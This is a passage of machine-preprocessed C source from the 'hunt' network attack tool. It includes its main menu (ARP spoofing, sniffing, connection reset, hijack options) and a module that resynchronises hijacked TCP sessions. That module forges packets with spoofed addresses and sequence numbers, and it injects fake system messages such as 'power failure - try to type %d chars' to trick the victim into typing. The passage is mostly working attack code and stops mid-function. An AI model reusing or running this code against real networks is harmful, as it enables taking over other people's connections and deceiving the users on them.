    tmp = menu((char *)"daemons", daemon_menu, (char *)"dm", daemon_chars, (char)0);
    }
    {
#line 390
    if (tmp == 114) {
#line 390
      goto case_114;
    }
#line 393
    if (tmp == 97) {
#line 393
      goto case_97;
    }
#line 396
    if (tmp == 115) {
#line 396
      goto case_115;
    }
#line 399
    if (tmp == 109) {
#line 399
      goto case_109;
    }
#line 402
    if (tmp == 120) {
#line 402
      goto case_120;
    }
#line 389
    goto switch_break;
    case_114: /* CIL Label */ 
    {
#line 391
    rstd_menu();
    }
#line 392
    goto switch_break;
    case_97: /* CIL Label */ 
    {
#line 394
    arpspoof_menu();
    }
#line 395
    goto switch_break;
    case_115: /* CIL Label */ 
    {
#line 397
    sniff_menu();
    }
#line 398
    goto switch_break;
    case_109: /* CIL Label */ 
    {
#line 400
    mac_disc_menu();
    }
#line 401
    goto switch_break;
    case_120: /* CIL Label */ 
#line 403
    run_it = 0;
#line 404
    goto switch_break;
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 407
  return;
}
}
#line 409 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
static void init_modules(void) 
{ 


  {
#line 411
  return;
}
}
#line 413 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
static void usage(char *argv0 ) 
{ 
  char *prog_name ;

  {
  {
#line 417
  prog_name = strrchr((char const   *)argv0, '/');
  }
#line 417
  if (prog_name) {
#line 418
    prog_name ++;
  } else {
#line 420
    prog_name = argv0;
  }
  {
#line 421
  fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"usage: %s -vV [-i eth_interface]\n",
          prog_name);
  }
#line 422
  return;
}
}
#line 424 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
char *main_menu  =    (char *)"l/w/r) list/watch/reset connections\nu)     host up tests\na)     arp/simple hijack (avoids ack storm if arp used)\ns)     simple hijack\nd)     daemons rst/arp/sniff/mac\no)     options\nx)     exit\n";
#line 431 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
char *main_menu_opt  =    (char *)"lwrusadox";
#line 433 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
char *eth_device  =    (char *)"eth0";
#line 436 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void finish_c_handler(int sig ) 
{ 


  {
  {
#line 438
  exit(1);
  }
}
}
#line 441 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
void main_reset(void) 
{ 


  {
  {
#line 443
  tap(eth_device, 0);
#line 444
  fprintf((FILE */* __restrict  */)stdout, (char const   */* __restrict  */)"\033[0;0;0m");
#line 445
  printf((char const   */* __restrict  */)"\ndone\n");
  }
#line 446
  return;
}
}
#line 449 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
pthread_t th_hunt  =    (pthread_t )0;
#line 450 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
pthread_t main_thread_id  =    (pthread_t )0;
#line 451 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
int verbose  =    0;
#line 454 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
int tj_func(void *arg , int sec ) 
{ 


  {
  {
#line 456
  printf((char const   */* __restrict  */)"tj func %s return %d\n", (char *)arg, sec);
  }
#line 457
  return (sec);
}
}
#line 460 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/main.c"
int main(int argc , char **argv ) 
{ 
  struct user_conn_info uci ;
  struct sigaction sac ;
  int run_it ;
  int c ;
  int skfd ;
  struct ifreq my_ifreq ;
  int r ;
  __uid_t tmp ;
  __uid_t tmp___0 ;
  int tmp___1 ;
  __pid_t tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;
  int tmp___5 ;
  int tmp___6 ;
  int tmp___7 ;

  {
  {
#line 470
  tmp = geteuid();
  }
#line 470
  if (tmp) {
    {
#line 471
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"UID or EUID of 0 needed\n");
#line 472
    exit(1);
    }
  } else {
    {
#line 470
    tmp___0 = getuid();
    }
#line 470
    if (tmp___0) {
      {
#line 471
      fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"UID or EUID of 0 needed\n");
#line 472
      exit(1);
      }
    }
  }
  {
#line 474
  main_thread_id = pthread_self();
  }
  {
#line 475
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 475
    c = getopt(argc, (char * const  *)argv, "vVi:");
    }
#line 475
    if (! (c != -1)) {
#line 475
      goto while_break;
    }
    {
#line 477
    if (c == 105) {
#line 477
      goto case_105;
    }
#line 480
    if (c == 118) {
#line 480
      goto case_118;
    }
#line 483
    if (c == 86) {
#line 483
      goto case_86;
    }
#line 486
    goto switch_default;
    case_105: /* CIL Label */ 
#line 478
    eth_device = optarg;
#line 479
    goto switch_break;
    case_118: /* CIL Label */ 
#line 481
    verbose ++;
#line 482
    goto switch_break;
    case_86: /* CIL Label */ 
    {
#line 484
    printf((char const   */* __restrict  */)"hunt: version 1.5\n");
#line 485
    exit(0);
    }
    switch_default: /* CIL Label */ 
    {
#line 487
    usage(*(argv + 0));
#line 488
    exit(1);
    }
    switch_break: /* CIL Label */ ;
    }
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 493
  skfd = socket(2, 2, 0);
  }
#line 494
  if (skfd == -1) {
    {
#line 495
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"IPv4 not supported\n");
#line 496
    exit(1);
    }
  }
  {
#line 498
  memset((void *)(& my_ifreq), 0, sizeof(my_ifreq));
#line 499
  strncpy((char */* __restrict  */)(my_ifreq.ifr_ifrn.ifrn_name), (char const   */* __restrict  */)eth_device,
          (size_t )16);
#line 501
  r = ioctl(skfd, 35091UL, & my_ifreq);
  }
#line 502
  if (r != -1) {
#line 502
    if (! (((int )my_ifreq.ifr_ifru.ifru_flags & 1) == 1)) {
      {
#line 503
      fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"Network interface %s is down\n",
              eth_device);
#line 504
      exit(1);
      }
    }
  }
  {
#line 508
  tmp___1 = ioctl(skfd, 35093UL, & my_ifreq);
  }
#line 508
  if (tmp___1 == -1) {
    {
#line 509
    fprintf((FILE */* __restrict  */)stderr, (char const   */* __restrict  */)"Network interface %s does not have an ip address\n",
            eth_device);
#line 511
    exit(1);
    }
  }
  {
#line 514
  close(skfd);
#line 516
  sigemptyset(& intr_mask);
#line 517
  sigaddset(& intr_mask, 2);
#line 519
  tmp___2 = getpid();
#line 519
  setpriority(0, (id_t )tmp___2, 0);
#line 520
  sac.__sigaction_handler.sa_handler = & finish_c_handler;
#line 521
  sigemptyset(& sac.sa_mask);
#line 522
  sigaddset(& sac.sa_mask, 2);
#line 523
  sac.sa_flags = 268435456;
#line 524
  sigaction(2, (struct sigaction  const  */* __restrict  */)(& sac), (struct sigaction */* __restrict  */)((void *)0));
#line 526
  logo();
#line 528
  resolv_init();
#line 529
  timer_init();
#line 530
  init_modules();
#line 532
  tmp___3 = pthread_create((pthread_t */* __restrict  */)(& th_hunt), (pthread_attr_t const   */* __restrict  */)((void *)0),
                           & hunt, (void */* __restrict  */)((void *)0));
  }
#line 532
  if (tmp___3) {
    {
#line 533
    exit(1);
    }
  }
  {
#line 534
  pthread_mutex_lock(& mutex_hunt_ready);
  }
  {
#line 535
  while (1) {
    while_continue___0: /* CIL Label */ ;
#line 535
    if (! (! hunt_ready)) {
#line 535
      goto while_break___0;
    }
    {
#line 536
    pthread_cond_wait((pthread_cond_t */* __restrict  */)(& cond_hunt_ready), (pthread_mutex_t */* __restrict  */)(& mutex_hunt_ready));
    }
  }
  while_break___0: /* CIL Label */ ;
  }
  {
#line 537
  pthread_mutex_unlock(& mutex_hunt_ready);
#line 538
  atexit(& main_reset);
#line 539
  atexit(& tty_atexit);
#line 540
  atexit(& timer_done);
#line 541
  atexit(& resolv_done);
#line 543
  run_it = 1;
  }
  {
#line 544
  while (1) {
    while_continue___1: /* CIL Label */ ;
#line 544
    if (! run_it) {
#line 544
      goto while_break___1;
    }
    {
#line 545
    tmp___4 = menu((char *)"Main Menu", main_menu, (char *)((void *)0), main_menu_opt,
                   (char)0);
    }
    {
#line 546
    if (tmp___4 == 108) {
#line 546
      goto case_108;
    }
#line 549
    if (tmp___4 == 114) {
#line 549
      goto case_114;
    }
#line 552
    if (tmp___4 == 115) {
#line 552
      goto case_115;
    }
#line 555
    if (tmp___4 == 97) {
#line 555
      goto case_97;
    }
#line 558
    if (tmp___4 == 119) {
#line 558
      goto case_119;
    }
#line 562
    if (tmp___4 == 117) {
#line 562
      goto case_117;
    }
#line 565
    if (tmp___4 == 100) {
#line 565
      goto case_100;
    }
#line 568
    if (tmp___4 == 111) {
#line 568
      goto case_111;
    }
#line 571
    if (tmp___4 == 120) {
#line 571
      goto case_120;
    }
#line 545
    goto switch_break___0;
    case_108: /* CIL Label */ 
    {
#line 547
    list_connections();
    }
#line 548
    goto switch_break___0;
    case_114: /* CIL Label */ 
    {
#line 550
    reset_connection();
    }
#line 551
    goto switch_break___0;
    case_115: /* CIL Label */ 
    {
#line 553
    simple_hijack();
    }
#line 554
    goto switch_break___0;
    case_97: /* CIL Label */ 
    {
#line 556
    a_hijack();
    }
#line 557
    goto switch_break___0;
    case_119: /* CIL Label */ 
    {
#line 559
    tmp___5 = choose_connection(& uci);
    }
#line 559
    if (! tmp___5) {
      {
#line 560
      dump_connection(& uci);
      }
    }
#line 561
    goto switch_break___0;
    case_117: /* CIL Label */ 
    {
#line 563
    host_up();
    }
#line 564
    goto switch_break___0;
    case_100: /* CIL Label */ 
    {
#line 566
    choose_daemon();
    }
#line 567
    goto switch_break___0;
    case_111: /* CIL Label */ 
    {
#line 569
    options_menu();
    }
#line 570
    goto switch_break___0;
    case_120: /* CIL Label */ 
    {
#line 572
    tmp___6 = arpspoof_exit_check();
    }
#line 572
    if (tmp___6 != 0) {
#line 573
      goto switch_break___0;
    }
    {
#line 574
    tmp___7 = menu_choose_char((char *)"exit? y/n", (char *)"yn", (char )'y');
    }
    {
#line 575
    if (tmp___7 == 121) {
#line 575
      goto case_121;
    }
#line 574
    goto switch_break___1;
    case_121: /* CIL Label */ 
#line 576
    run_it = 0;
#line 577
    goto switch_break___1;
    switch_break___1: /* CIL Label */ ;
    }
#line 579
    goto switch_break___0;
    switch_break___0: /* CIL Label */ ;
    }
  }
  while_break___1: /* CIL Label */ ;
  }
#line 582
  return (0);
}
}
#line 379 "/usr/include/netinet/in.h"
extern  __attribute__((__nothrow__)) uint16_t ( __attribute__((__leaf__)) htons)(uint16_t __hostshort )  __attribute__((__const__)) ;
#line 71 "/usr/include/x86_64-linux-gnu/sys/time.h"
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1), __leaf__)) gettimeofday)(struct timeval * __restrict  __tv ,
                                                                                                   __timezone_ptr_t __tz ) ;
#line 482 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
struct list l_hijack_conn ;
#line 513
int hijack_sync(struct conn_info *ci ) ;
#line 673
int send_tcp_packet(struct tcp_spec *ts ) ;
#line 399 "/usr/include/string.h"
extern  __attribute__((__nothrow__)) size_t ( __attribute__((__nonnull__(1), __leaf__)) strlen)(char const   *__s )  __attribute__((__pure__)) ;
#line 22 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
void func_hijack_dst_sync(struct packet *p , struct conn_info *arg ) 
{ 


  {
#line 28
  if ((unsigned long )(p->p_iph)->saddr == arg->dst_addr) {
#line 28
    if ((unsigned long )(p->p_iph)->daddr == arg->src_addr) {
#line 28
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )arg->dst_port) {
#line 28
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )arg->src_port) {
          {
#line 42
          packet_want(p);
#line 43
          list_produce(& l_hijack_conn, (void *)p);
          }
        }
      }
    }
  }
#line 45
  return;
}
}
#line 47 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
void func_hijack_src_sync(struct packet *p , struct conn_info *arg ) 
{ 


  {
#line 53
  if ((unsigned long )(p->p_iph)->saddr == arg->src_addr) {
#line 53
    if ((unsigned long )(p->p_iph)->daddr == arg->dst_addr) {
#line 53
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )arg->src_port) {
#line 53
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )arg->dst_port) {
          {
#line 67
          packet_want(p);
#line 68
          list_produce(& l_hijack_conn, (void *)p);
          }
        }
      }
    }
  }
#line 70
  return;
}
}
#line 74 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int user_hijack_sync(struct user_conn_info *uci ) 
{ 
  struct conn_info *ci ;
  int retval ;

  {
  {
#line 79
  ci = conn_get(uci);
  }
#line 79
  if (ci) {
    {
#line 83
    retval = hijack_sync(ci);
    }
#line 83
    if (retval < 0) {
      {
#line 84
      printf((char const   */* __restrict  */)"sync failed\n");
      }
    }
    {
#line 85
    conn_free(ci);
    }
  } else {
    {
#line 80
    printf((char const   */* __restrict  */)"connection isn\'t available\n");
#line 81
    retval = 1;
    }
  }
#line 87
  return (retval);
}
}
#line 92
static char *suggest_sync_msg(int first ) ;
#line 92 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static int count  =    0;
#line 93 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static int old_count  =    0;
#line 90 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static char *suggest_sync_msg(int first ) 
{ 
  char *retval ;
  char *m1[5] ;
  char *m2[5] ;

  {
#line 96
  m1[0] = (char *)"\r\nmsg from root: power failure - try to type %d chars\r\n";
#line 96
  m1[1] = (char *)"\r\nfuck you type %d chars immediately\r\n";
#line 96
  m1[2] = (char *)"\r\nI/O failure detected, %d chars will solve it\r\n";
#line 96
  m1[3] = (char *)"\r\nmachine is going down within 5 min, type %d chars\r\n";
#line 96
  m1[4] = (char *)"\r\nsegmentation fault - %d chars to resume\r\n";
#line 102
  m2[0] = (char *)"\r\npower failure detected\r\n... power resumed, ok\r\n";
#line 102
  m2[1] = (char *)"\r\nready\r\n";
#line 102
  m2[2] = (char *)"\r\nI/O resumed\r\n";
#line 102
  m2[3] = (char *)"\r\nmachine shutdown canceled\r\n";
#line 102
  m2[4] = (char *)"\r\nyou have new mail\r\n";
#line 108
  if (first) {
#line 109
    retval = m1[count];
#line 110
    old_count = count;
#line 111
    count = (int )((unsigned long )(count + 1) % (sizeof(m1) / sizeof(char *)));
  } else {
#line 113
    retval = m2[old_count];
  }
#line 115
  return (retval);
}
}
#line 118 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int volatile   need_read  ;
#line 118 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int volatile   need_write  ;
#line 119 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int volatile   sync_was_canceled  ;
#line 120 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int volatile   f_sync_done  ;
#line 121 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
int nw_was_negative  ;
#line 123 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static void hijack_sync_init_msg(struct conn_info *ci ) 
{ 
  int len ;
  int msg_len ;
  char buf[128] ;
  struct tcp_spec ts ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  char *tmp___3 ;
  uint16_t tmp___4 ;
  uint16_t tmp___5 ;

  {
  {
#line 132
  tmp = ntohl((uint32_t )ci->dst.next_d_seq);
#line 132
  tmp___0 = ntohl((uint32_t )ci->src.next_seq);
#line 132
  need_read = (int volatile   )(tmp - tmp___0);
#line 133
  tmp___1 = ntohl((uint32_t )ci->dst.next_seq);
#line 133
  tmp___2 = ntohl((uint32_t )ci->src.next_d_seq);
#line 133
  need_write = (int volatile   )(tmp___1 - tmp___2);
#line 134
  printf((char const   */* __restrict  */)"user have to type %d chars and print %d chars to synchronize connection\n",
         need_read, need_write);
#line 135
  ctrl_c_prompt();
  }
#line 136
  if (need_read <= (int volatile   )0) {
#line 138
    return;
  }
#line 140
  if (need_write <= (int volatile   )0) {
#line 142
    return;
  }
  {
#line 144
  len = (int )(need_write - need_read);
#line 145
  tmp___3 = suggest_sync_msg(1);
#line 145
  msg_len = sprintf((char */* __restrict  */)(buf), (char const   */* __restrict  */)tmp___3,
                    need_read);
  }
#line 146
  if (len >= msg_len) {
    {
#line 147
    len = msg_len;
#line 148
    memset((void *)(& ts), 0, sizeof(ts));
#line 149
    ts.saddr = ci->dst_addr;
#line 150
    ts.daddr = ci->src_addr;
#line 151
    ts.sport = ci->dst_port;
#line 152
    ts.dport = ci->src_port;
#line 153
    ts.src_mac = (char *)(ci->src.dst_mac);
#line 154
    ts.dst_mac = (char *)(ci->src.src_mac);
#line 155
    ts.seq = ci->src.next_d_seq;
#line 156
    ts.ack_seq = ci->src.next_seq;
    }
#line 157
    if (ci->dst.window) {
#line 157
      ts.window = ci->dst.window;
    } else {
      {
#line 157
      tmp___4 = htons((uint16_t )242);
#line 157
      ts.window = tmp___4;
      }
    }
    {
#line 158
    tmp___5 = ntohs(ci->dst.id);
#line 158
    ts.id = htons((uint16_t )((int )tmp___5 + 1));
#line 159
    ts.ack = 1;
#line 160
    ts.psh = 1;
#line 161
    ts.rst = 0;
#line 162
    ts.data = buf;
#line 163
    ts.data_len = len;
#line 164
    need_write -= (int volatile   )len;
#line 169
    send_tcp_packet(& ts);
    }
  }
#line 175
  return;
}
}
#line 187 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static int need_read_want_n  =    0;
#line 188 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static int need_write_want_n  =    0;
#line 190 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static void need_read_write_init(void) 
{ 


  {
#line 192
  need_read_want_n = -100000;
#line 193
  need_write_want_n = -100000;
#line 194
  return;
}
}
#line 196 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static void need_read_write_negative(struct conn_info *ci ) 
{ 
  struct tcp_spec ts ;
  char buf[1400] ;
  int len ;
  uint16_t tmp ;

  {
#line 205
  if (need_read > (int volatile   )0) {
#line 205
    if (need_write > (int volatile   )0) {
#line 206
      return;
    }
  }
#line 207
  if (need_read_want_n > (int )need_read) {
#line 208
    return;
  } else
#line 207
  if (need_write_want_n > (int )need_write) {
#line 208
    return;
  }
#line 209
  if (need_read < need_write) {
#line 210
    len = (int )(- need_read);
  } else {
#line 212
    len = (int )(- need_write);
  }
#line 213
  if ((unsigned long )len > sizeof(buf)) {
#line 214
    len = (int )sizeof(buf);
  }
  {
#line 215
  memset((void *)(buf), ' ', (size_t )len);
#line 216
  ts.saddr = ci->src_addr;
#line 217
  ts.daddr = ci->dst_addr;
#line 218
  ts.sport = ci->src_port;
#line 219
  ts.dport = ci->dst_port;
#line 220
  ts.src_mac = (char *)(ci->dst.dst_mac);
#line 221
  ts.dst_mac = (char *)(ci->dst.src_mac);
#line 222
  ts.seq = ci->dst.next_d_seq;
#line 223
  ts.ack_seq = ci->dst.next_seq;
  }
#line 224
  if (ci->src.window) {
#line 224
    ts.window = ci->src.window;
  } else {
    {
#line 224
    tmp = htons((uint16_t )242);
#line 224
    ts.window = tmp;
    }
  }
  {
#line 225
  ts.ack = 1;
#line 226
  ts.psh = 1;
#line 227
  ts.rst = 0;
#line 228
  ts.data = buf;
#line 229
  ts.data_len = len;
#line 230
  send_tcp_packet(& ts);
#line 231
  need_read += (int volatile   )len;
#line 232
  need_write += (int volatile   )len;
#line 233
  need_read_want_n = (int )need_read;
#line 234
  need_write_want_n = (int )need_write;
  }
#line 235
  return;
}
}
#line 237 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static void need_write_positive(struct conn_info *ci , char *data , int data_len ) 
{ 
  struct tcp_spec ts ;
  char buf[512] ;
  char fin_msg[512] ;
  int fin_msg_len ;
  int len ;
  char *tmp ;
  size_t tmp___0 ;
  uint16_t tmp___1 ;
  uint16_t tmp___2 ;

  {
  {
#line 245
  tmp = suggest_sync_msg(0);
#line 245
  sprintf((char */* __restrict  */)(fin_msg), (char const   */* __restrict  */)tmp);
#line 246
  tmp___0 = strlen((char const   *)(fin_msg));
#line 246
  fin_msg_len = (int )tmp___0;
  }
#line 247
  if (! data) {
#line 259
    len = (int )need_write;
#line 260
    if ((unsigned long )len > sizeof(buf)) {
      {
#line 261
      len = (int )sizeof(buf);
#line 262
      memset((void *)(buf), ' ', (size_t )len);
      }
    } else
#line 264
    if (len > fin_msg_len) {
      {
#line 265
      memset((void *)(buf), ' ', (size_t )(len - fin_msg_len));
#line 266
      memcpy((void */* __restrict  */)((buf + len) - fin_msg_len), (void const   */* __restrict  */)(fin_msg),
             (size_t )fin_msg_len);
      }
    } else {
      {
#line 268
      memcpy((void */* __restrict  */)(buf), (void const   */* __restrict  */)(fin_msg + (fin_msg_len - len)),
             (size_t )len);
      }
    }
#line 270
    data = buf;
#line 271
    data_len = len;
  }
  {
#line 274
  memset((void *)(& ts), 0, sizeof(ts));
#line 275
  ts.saddr = ci->dst_addr;
#line 276
  ts.daddr = ci->src_addr;
#line 277
  ts.sport = ci->dst_port;
#line 278
  ts.dport = ci->src_port;
#line 279
  ts.src_mac = (char *)(ci->src.dst_mac);
#line 280
  ts.dst_mac = (char *)(ci->src.src_mac);
#line 281
  ts.seq = ci->src.next_d_seq;
#line 282
  ts.ack_seq = ci->src.next_seq;
  }
#line 283
  if (ci->dst.window) {
#line 283
    ts.window = ci->dst.window;
  } else {
    {
#line 283
    tmp___1 = htons((uint16_t )242);
#line 283
    ts.window = tmp___1;
    }
  }
  {
#line 284
  tmp___2 = ntohs(ci->dst.id);
#line 284
  ts.id = htons((uint16_t )((int )tmp___2 + 1));
#line 285
  ts.ack = 1;
#line 286
  ts.psh = 1;
#line 287
  ts.rst = 0;
#line 288
  ts.data = data;
#line 289
  ts.data_len = data_len;
#line 290
  send_tcp_packet(& ts);
#line 291
  need_write -= (int volatile   )data_len;
  }
#line 296
  return;
}
}
#line 298 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static void need_read_positive(struct packet *p , struct conn_info *ci ) 
{ 
  struct tcp_spec ts ;
  uint16_t tmp ;
  uint16_t tmp___0 ;

  {
  {
#line 302
  memset((void *)(& ts), 0, sizeof(ts));
#line 303
  ts.saddr = ci->dst_addr;
#line 304
  ts.daddr = ci->src_addr;
#line 305
  ts.sport = ci->dst_port;
#line 306
  ts.dport = ci->src_port;
#line 307
  ts.src_mac = (char *)(ci->src.dst_mac);
#line 308
  ts.dst_mac = (char *)(ci->src.src_mac);
#line 309
  ts.seq = ci->src.next_d_seq;
#line 310
  ts.ack_seq = ci->src.next_seq;
  }
#line 311
  if (ci->dst.window) {
#line 311
    ts.window = ci->dst.window;
  } else {
    {
#line 311
    tmp = htons((uint16_t )242);
#line 311
    ts.window = tmp;
    }
  }
  {
#line 312
  tmp___0 = ntohs(ci->dst.id);
#line 312
  ts.id = htons((uint16_t )((int )tmp___0 + 1));
#line 313
  ts.ack = 1;
#line 314
  ts.psh = 1;
#line 315
  ts.rst = 0;
#line 316
  ts.data = p->p_data;
#line 317
  ts.data_len = p->p_data_len;
  }
#line 318
  if ((int )*(p->p_data + 0) == 13) {
#line 319
    ts.data = (char *)"\r\n$ ";
#line 320
    ts.data_len = 4;
  } else
#line 318
  if ((int )*(p->p_data + 0) == 10) {
#line 319
    ts.data = (char *)"\r\n$ ";
#line 320
    ts.data_len = 4;
  } else {
#line 322
    ts.data = p->p_data;
#line 323
    ts.data_len = p->p_data_len;
  }
  {
#line 325
  send_tcp_packet(& ts);
#line 326
  need_read -= (int volatile   )p->p_data_len;
#line 327
  need_write -= (int volatile   )p->p_data_len;
  }
#line 332
  return;
}
}
#line 336 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static unsigned int last_read_ack  ;
#line 336 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
static unsigned int dst_last_ack  ;
#line 334 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/synchijack.c"
void f_hijack_sync(struct packet *p , struct conn_info *ci ) 
{ 
  struct tcp_spec ts ;
  char buf[512] ;
  char *w_data ;
  int len ;
  uint32_t tmp ;
  uint32_t tmp___0 ;
  uint32_t tmp___1 ;
  uint32_t tmp___2 ;
  uint32_t tmp___3 ;
  uint32_t tmp___4 ;
  uint32_t tmp___5 ;
  uint32_t tmp___6 ;
  uint32_t tmp___7 ;
  uint16_t tmp___8 ;

  {
#line 353
  if ((unsigned long )(p->p_iph)->saddr == ci->src_addr) {
#line 353
    if ((unsigned long )(p->p_iph)->daddr == ci->dst_addr) {
#line 353
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )ci->src_port) {
#line 353
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )ci->dst_port) {
          {
#line 360
          tmp = ntohl((uint32_t )ci->dst.next_d_seq);
#line 360
          tmp___0 = ntohl((uint32_t )ci->src.next_seq);
#line 360
          need_read = (int volatile   )(tmp - tmp___0);
#line 361
          tmp___1 = ntohl((uint32_t )ci->dst.next_seq);
#line 361
          tmp___2 = ntohl((uint32_t )ci->src.next_d_seq);
#line 361
          need_write = (int volatile   )(tmp___1 - tmp___2);
          }
#line 363
          if (need_read) {
#line 364
            if (need_read > (int volatile   )0) {
#line 364
              if (need_write >= (int volatile   )0) {
#line 365
                if (p->p_data_len > 0) {
                  {
#line 366
                  print_data_packet(p, p->p_data_len, 0, 0);
#line 367
                  need_read_positive(p, ci);
#line 368
                  tmp___3 = ntohl((uint32_t )ci->src.next_d_seq);
#line 368
                  last_read_ack = htonl(tmp___3 + (uint32_t )p->p_data_len);
                  }
                }
              } else {
                {
#line 373
                need_read_write_negative(ci);
                }
              }
            } else {
              {
#line 373
              need_read_write_negative(ci);
              }
            }
          } else
#line 375
          if (need_write > (int volatile   )0) {
#line 376
            if (p->p_data_len) {
              {
#line 377
              print_data_packet(p, p->p_data_len, 0, 0);
              }
            }
#line 378
            if (last_read_ack == (p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.ack_seq) {
#line 378
              if (p->p_data_len) {
#line 379
                len = p->p_data_len;
#line 380
                if ((unsigned long )len > sizeof(buf)) {
#line 381
                  len = (int )sizeof(buf);
                }
                {
#line 382
                memcpy((void */* __restrict  */)(buf), (void const   */* __restrict  */)p->p_data,
                       (size_t )len);
#line 383
                w_data = buf;
                }
              } else {
#line 385
                len = 0;
#line 386
                w_data = (char *)((void *)0);
              }
            } else {
#line 385
              len = 0;
#line 386
              w_data = (char *)((void *)0);
            }
            {
#line 388
            need_write_positive(ci, w_data, len);
            }
          } else
#line 389
          if (need_write < (int volatile   )0) {
            {
#line 390
            need_read_write_negative(ci);
            }
          } else {
#line 399
            f_sync_done = (int volatile   )1;
          }
        } else {
#line 353
          goto _L___1;
        }
      } else {
#line 353
        goto _L___1;
      }
    } else {
#line 353
      goto _L___1;
    }
  } else
  _L___1: /* CIL Label */ 
#line 406
  if ((unsigned long )(p->p_iph)->saddr == ci->dst_addr) {
#line 406
    if ((unsigned long )(p->p_iph)->daddr == ci->src_addr) {
#line 406
      if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.source == (int )ci->dst_port) {
#line 406
        if ((int )(p->p_hdr.p_tcph)->__annonCompField3.__annonCompField2.dest == (int )ci->src_port) {
          {
#line 410
          tmp___4 = ntohl((uint32_t )ci->dst.next_d_seq);
#line 410
          tmp___5 = ntohl((uint32_t )ci->src.next_seq);
#line 410
          need_read = (int volatile   )(tmp___4 - tmp___5);
#line 411
          tmp___6 = ntohl((uint32_t )ci->dst.next_seq);
#line 411
          tmp___7 = ntohl((uint32_t )ci->src.next_d_seq);
#line 411
          need_write = (int volatile   )(tmp___6 - tmp___7);
          }
#line 413
          if ((unsigned long )dst_last_ack != ci->dst.next_seq) {
#line 415
            ts.saddr = ci->src_addr;
#line 416
            ts.daddr = ci->dst_addr;
#line 417
            ts.sport = ci->src_port;
#line 418
            ts.dport = ci->dst_port;
#line 419
            ts.src_mac = (char *)(ci->dst.dst_mac);
#line 420
            ts.dst_mac = (char *)(ci->dst.src_mac);
#line 421
            ts.seq = ci->dst.next_d_seq;
#line 422
            ts.ack_seq = ci->dst.next_seq;
#line 423
            if (ci->src.window) {
#line 423
              ts.window = ci->src.window;
            } else {
              {
#line 423
              tmp___8 = htons((uint16_t )242);
#line 423
              ts.window = tmp___8;
              }
            }
            {
#line 424
            ts.ack = 1;
#line 425
            ts.psh = 1;
#line 426
            ts.rst = 0;
#line 427
            ts.data = (char *)((void *)0);
#line 428
            ts.data_len = 0;
#line 429
            send_tcp_packet(& ts);
#line 431
            dst_last_ack = (unsigned int )ts.ack_seq;
            }
#line 433
            if (need_read < (int volatile   )0) {
              {
#line 434
              need_read_write_negative(ci);
              }
            } else
#line 433
            if (need_write < (int volatile   )0) {
              {
#line 434
              need_read_write_negative(ci);
              }
            } else
#line 435
            if (need_read == (int volatile   )0) {
#line 436
              if (need_write > (int volatile   )0) {
                {
#line 437
                need_write_positive(ci, (char *)((void *)0), 0);
                }
              }
            } else
#line 439
            if (nw_was_negative) {
              {
#line 440
              nw_was_negative = 0;
#line 441
              hijack_sync_init_msg(ci);
              }
            }
          }
#line 445
